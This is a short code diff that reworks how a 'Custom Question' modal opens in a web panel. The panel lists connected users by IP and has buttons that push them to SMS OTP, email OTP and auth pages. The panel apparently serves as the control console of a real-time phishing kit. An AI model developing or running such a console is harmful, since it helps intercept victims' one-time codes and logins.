@@ -191,7 +191,7 @@ function updateConnectionsTable(users) {
           <a href="#" class="m-1 btn btn-warning send-otp-sms-button">Send SMS OTP</a>
           <a href="#" class="m-1 btn btn-warning send-otp-email-button">Send EMAIL OTP</a>
           <a href="#" class="m-1 btn btn-warning send-auth-button">Send AUTH</a>
-          <button class="m-1 btn btn-warning" type="button" data-toggle="modal" data-target="#customQuestionModal">Custom Question</button>
+          <button class="m-1 btn btn-warning" type="button" id="customQuestionTrigger">Custom Question</button>
           </div>
       </div>
 
@@ -212,6 +212,10 @@ function updateConnectionsTable(users) {
       sendAuthButton.addEventListener('click', function() {
         socket.emit('sendOTP', {ip: ipAddress, navig: `auth` })
       });    
+
+      document.getElementById('customQuestionTrigger').addEventListener('click', function() {
+        $('#customQuestionModal').modal('show');
+      });
 
       document.getElementById('sendCustomQuestionButton').addEventListener('click', function() {
         var customQuestion = document.getElementById('customQuestion').value;
